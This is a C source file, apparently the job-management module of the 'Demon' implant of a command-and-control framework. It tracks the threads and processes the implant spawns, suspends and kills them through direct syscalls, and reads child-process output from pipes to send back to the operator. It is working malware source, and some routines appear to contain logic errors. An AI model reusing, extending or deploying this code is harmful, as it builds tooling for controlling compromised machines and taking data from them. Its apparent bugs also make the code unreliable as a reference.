#include <Demon.h>

#include <Core/Jobs.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <Loader/ObjectApi.h>

/*!
 * JobAdd
 * Adds a job to the job linked list
 * @param JobID
 * @param Type type of job: thread or process
 * @param State current state of the job: suspended or running
 * @param Data Data pointer to extra data
 * @return
 */
VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
{
    PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d] Handle:[%d] Data:[%p]\n", JobID, Type, State, Handle, Data )

    PJOB_DATA JobList = NULL;
    PJOB_DATA Job     = NULL;

    Job = Instance.Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );

    // fill the Job info and insert it into our linked list
    Job->JobID  = JobID;
    Job->Type   = Type;
    Job->State  = State;
    Job->Handle = Handle;
    Job->Data   = Data;
    Job->Next   = NULL;

    if ( Instance.Jobs == NULL )
    {
        Instance.Jobs = Job;
        return;
    }

    JobList = Instance.Jobs;

    do {
        if ( JobList )
        {
            if ( JobList->Next != NULL )
                JobList = JobList->Next;
            else
            {
                JobList->Next = Job;
                break;
            }
        } else
            break;

    } while ( TRUE );
}

/*!
 * Check if all jobs are still running and exists
 * @return
 */
VOID JobCheckList()
{
    PJOB_DATA JobList = NULL;

    JobList = Instance.Jobs;

    do {
        if ( ! JobList )
            break;

        switch ( JobList->Type )
        {
            case JOB_TYPE_PROCESS:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Return = 0;
                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Return );

                    if ( Return != STILL_ACTIVE )
                        JobList->State = JOB_STATE_DEAD;
                }
                break;
            }

            case JOB_TYPE_THREAD:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Return = 0;
                    Instance.Win32.GetExitCodeThread( JobList->Handle, &Return );

                    if ( Return != STILL_ACTIVE )
                        JobList->State = JOB_STATE_DEAD;
                }

                break;
            }

            case JOB_TYPE_TRACK_PROCESS:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Status = 0;

                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Status );

                    if ( Status != STILL_ACTIVE )
                    {
                        PUTS( "Tracking process is dead." )
                        JobList->State = JOB_STATE_DEAD;
                        AnonPipesRead( ( ( PANONPIPE ) JobList->Data ) );

                        Instance.Win32.NtClose( JobList->Handle );
                        DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
                    }
                    else
                    {
                        // just read what there is available.
                        DWORD Available = 0;
                        PVOID Buffer    = NULL;
                        DWORD Size      = 0;

                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                        {
                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );

                            if ( Available > 0 )
                            {
                                Size   = Available;
                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );

                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                {
                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
                                    PackageAddBytes( Package, Buffer, Available );
                                    PackageTransmit( Package, NULL, NULL );
                                }

                                DATA_FREE( Buffer, Size )
                            }
                        }
                    }
                }

                break;
            }
        }

        JobList = JobList->Next;
    } while ( TRUE );
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobSuspend( DWORD JobID )
{
    PJOB_DATA JobList = Instance.Jobs;

    do
    {
        if ( JobList )
        {
            if ( JobList->JobID == JobID )
            {
                PRINTF( "Found Job ID: %d", JobID )

                if ( JobList->Type == JOB_TYPE_THREAD )
                {
                    PUTS( "Suspending Thread" )
                    HANDLE   Handle   = JobList->Handle;
                    NTSTATUS NtStatus = STATUS_SUCCESS;

                    if ( Handle )
                    {
                        NtStatus = Instance.Syscall.NtSuspendThread( JobList->Handle, NULL );
                        if ( NT_SUCCESS( NtStatus ) )
                        {
                            JobList->State = JOB_STATE_SUSPENDED;
                            return TRUE;
                        }
                        else
                        {
                            return FALSE;
                        }
                    }
                    else
                    {
                        PUTS( "Handle is empty" )
                        return FALSE;
                    }
                }
            }
            else
            {
                JobList = JobList->Next;
            }
        }
        else
            break;
    } while ( TRUE );

    return FALSE;
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobResume( DWORD JobID )
{
    PJOB_DATA JobList = Instance.Jobs;

    do
    {
        if ( JobList )
        {
            if ( JobList->JobID == JobID )
            {
                PRINTF( "Found Job ID: %d", JobID )

                if ( JobList->Type == JOB_TYPE_THREAD )
                {
                    PUTS( "Resume Thread" )
                    HANDLE   Handle   = JobList->Handle;
                    NTSTATUS NtStatus = STATUS_SUCCESS;

                    if ( Handle )
                    {
                        NtStatus = Instance.Syscall.NtResumeThread( JobList->Handle, NULL );
                        if ( NT_SUCCESS( NtStatus ) )
                        {
                            JobList->State = JOB_STATE_RUNNING;
                            return TRUE;
                        }
                        else
                            return FALSE;
                    }
                    else
                    {
                        PUTS( "Handle is empty" )
                        return FALSE;
                    }
                }
            }
            else break;
        }
        else break;
    } while ( TRUE );

    return FALSE;
}

/*!
 * JobKill
 * Kills and remove the specified job
 * @param JobID
 * @return
 */
BOOL JobKill( DWORD JobID )
{
    BOOL      Success = TRUE;
    PJOB_DATA JobList = Instance.Jobs;

    do {
        if ( ! JobList )
            break;

        if ( JobList->JobID == JobID )
        {
            PRINTF( "Found Job ID: %d\n", JobID )

            switch ( JobList->Type )
            {
                case JOB_TYPE_THREAD:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        PUTS( "Kill Thread" )
                        NTSTATUS NtStatus = STATUS_SUCCESS;

                        if ( JobList->Handle )
                        {
                            PUTS( "Kill using handle" )

                            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                            {
                                PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                                CALLBACK_GETLASTERROR;
                                Success = FALSE;
                            }
                            else
                            {
                                // remove one thread from counter
                                Instance.Threads--;
                            }
                        }
                        else
                        {
                            PUTS( "Handle is empty" )
                            Success = FALSE;
                        }
                    }
                    break;
                }

                case JOB_TYPE_PROCESS:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );
                    }
                    break;
                }

                case JOB_TYPE_TRACK_PROCESS:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );

                        // just read what there is available.
                        DWORD Available = 0;
                        PVOID Buffer    = NULL;

                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                        {
                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );

                            if ( Available > 0 )
                            {
                                DWORD Size = Available;
                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );

                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                {
                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
                                    PackageAddBytes( Package, Buffer, Available );
                                    PackageTransmit( Package, NULL, NULL );
                                }

                                DATA_FREE( Buffer, Size )
                            }
                        }
                    }

                    break;
                }
            }

            JobRemove( JobID );
        }
        else break;
    } while ( TRUE );

    return Success;
}

/*!
 * JobRemove
 * Remove the specified job
 * @param ThreadID
 * @return
 */
VOID JobRemove( DWORD JobID )
{
    // Iterate over Job list and replace/remove job
    PRINTF( "Remove JobID: %d\n", JobID );
    PUTS( "Iterate over Job list and replace/remove job" )
    PJOB_DATA JobList    = Instance.Jobs;
    PJOB_DATA JobListTmp = NULL;

    if ( Instance.Jobs->JobID == JobID )
    {
        Instance.Jobs = JobList->Next;
    }
    else
    {
        JobListTmp = JobList;

        while ( TRUE )
        {
            PRINTF( "JobListTmp => %p == %p\n", JobListTmp, JobList )
            if ( JobListTmp )
            {
                if ( JobListTmp->Next == JobList )
                {
                    PUTS( "Found Job. Replace/Remove it from list" )
                    JobListTmp->Next = JobList->Next;
                    break;
                }
                else
                {
                    JobListTmp = JobListTmp->Next;
                }
            }
        }
    }

    if ( JobList->Handle )
        Instance.Win32.NtClose( JobList->Handle );

    if ( ( JobList->Type == JOB_TYPE_TRACK_PROCESS ) && JobList->Data )
    {
        DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
    }

    MemSet( JobList, 0, sizeof( JOB_DATA ) );
    Instance.Win32.LocalFree( JobList );
    JobList = NULL;
}
